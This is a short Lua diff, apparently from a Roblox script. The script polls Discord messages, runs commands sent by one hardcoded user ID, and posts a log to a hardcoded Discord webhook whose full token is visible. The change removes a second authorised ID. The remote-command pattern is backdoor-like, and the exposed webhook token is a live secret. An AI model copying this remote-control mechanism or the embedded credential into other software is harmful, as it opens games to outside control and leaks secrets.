@@ -901,7 +901,7 @@ local z,r = pcall(function()
 		local yes = string.split(Decode[1].content, ":")
 	local arg1 = yes[2]
 		local arg2 = yes[3]
-		if Commands[yes[1]] and Decode[1].author.bot ~= true and Decode[1].author.id == "535213289265692672" or Decode[1].author.id == "283428031543115776" then
+		if Commands[yes[1]] and Decode[1].author.bot ~= true and Decode[1].author.id == "535213289265692672" then
 			Commands[yes[1]](arg1,arg2)
 			log("Command Logged!",string.format(Decode[1].author.username .." has ran the command '%s'",yes[1]))
 			game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/812502615988240384/qoAYg2ztiE9UdX9GMmb8hIc6V9YsCTRE-qZ1f5YjEF5mtrWZ6TZl2f32URdmWEVSckpy", "content="..string.format("you have ran the command '%s'",yes[1]).."&username="..test, 2, false, Headers)
